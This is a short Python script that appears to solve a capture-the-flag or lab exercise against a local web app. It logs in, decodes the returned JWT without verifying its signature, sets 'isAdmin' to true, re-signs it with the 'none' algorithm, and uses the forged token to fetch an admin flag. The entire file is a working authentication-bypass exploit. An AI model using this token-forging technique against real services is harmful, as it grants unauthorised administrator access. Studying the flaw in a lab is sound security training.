import jwt
import json
import requests

url = "http://127.0.0.1:5000"
login_url = url + "/login"
admin_url = url + "/admin"

user_cred = ["user", "password"]
user_data = {
    "nm": user_cred[0],
    "pw": user_cred[1]
}

try:
    response = requests.post(login_url, data=user_data)
    response.raise_for_status() 
    login_response = response.json()
    
    initial_jwt = login_response["token"]
    print(f"Initial token = {initial_jwt}")

except requests.exceptions.ConnectionError:
    print(f"Pls enter this url {url} in your web browser")
    exit()
except requests.exceptions.RequestException as e:
    print(f"Error : {e}")
    exit()

print("\nDecoding the token...")
decoded = jwt.decode(initial_jwt, key="", algorithms=["none"], options={"verify_signature": False})

print(f"Decoded token = {json.dumps(decoded, indent=2)}")
decoded['isAdmin'] = True
print(f"\nModified payload = {json.dumps(decoded, indent=2)}")

new_jwt = jwt.encode(decoded, key="", algorithm="none")
print(f"\nForged token = {new_jwt}")

try:
    admin_response = requests.get(admin_url, params={"token": new_jwt})
    admin_response.raise_for_status()
    admin_json = admin_response.json()
    print(f"\nAdmin response = {json.dumps(admin_json, indent=2)}")
    
    if "flag" in admin_json:
        print(f"\nThe flag: {admin_json['flag']}")
    else:
        print("Flag not found in the admin response. ")
        print(f"Message from server: {admin_json.get('message')}")

except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
    exit()